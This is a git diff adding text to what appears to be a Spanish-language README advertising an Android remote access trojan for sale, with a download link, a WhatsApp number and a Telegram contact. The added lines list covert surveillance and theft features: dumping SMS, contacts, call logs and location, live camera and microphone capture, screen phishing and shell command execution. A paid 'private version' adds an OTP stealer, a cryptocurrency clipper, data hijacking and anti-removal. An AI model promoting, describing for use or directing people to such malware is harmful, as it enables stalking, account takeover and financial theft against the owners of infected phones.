@@ -34,3 +34,56 @@ Descargar: https://nibiruanuna.wixsite.com/android-rat-spy
 ⭐️El constructor agrega más opciones de aplicaciones falsas
 
 ⭐️Mostrar si el dispositivo es administrador
+![68747470733a2f2f692e696d6775722e636f6d2f4f69554f55326e2e6a7067](https://github.com/AndroidRatas/AndroidRat/assets/133956592/f6df9e75-1575-47ac-b723-485fce0dd544)
+Disponible para rata
+
+Anti-Borrado
+Control de pantalla
+Formatear teléfono
+Llamada telefónica
+mensaje tostadora
+Administrador de archivos
+Phisher de pantalla
+Información del sistema de volcado
+Ubicación de volcado
+Transmisión de cámara web en vivo
+Mensajes de volcado
+Cambiar el modo de audio
+Volcar registros de llamadas
+Volcar la hora local
+Grabación de micrófono
+Desinstalar aplicación
+Lista de aplicaciones instaladas
+Enviar mensaje
+Volcar contactos
+Pantalla de bloqueo/desbloqueo
+Ejecutar comando de shell
+Instantánea de la cámara web
+Abre la app
+Instalar aplicación
+Información del dispositivo
+Ocultar/Mostrar el icono de la aplicación de carga útil
+
+Número de WhatsApp +1 (705) 300-3187
+https://t.me/nocrimer
+
+Versión privada
+Características
+
+Control de pantalla más rápido
+Control desde el navegador web
+Android Clipper (solo BTC y USDT)
+archivos
+Mensajes y contactos
+Reenviador de llamadas
+OTP Stealer (envía al panel y elimina)
+Panel satisfactorio
+Anti eliminación
+Enraizamiento automático (solo hasta Android 11)
+Enviar SMS
+Pantalla de bloqueo (pantalla encendida pero no táctil)
+Secuestro de datos
+Congelar teléfono
+dispositivo vibrata
+Cambiar el fondo de pantalla
+Encender/apagar (antorcha, bluetooth, ubicación, volumen, etc.) Muchos más
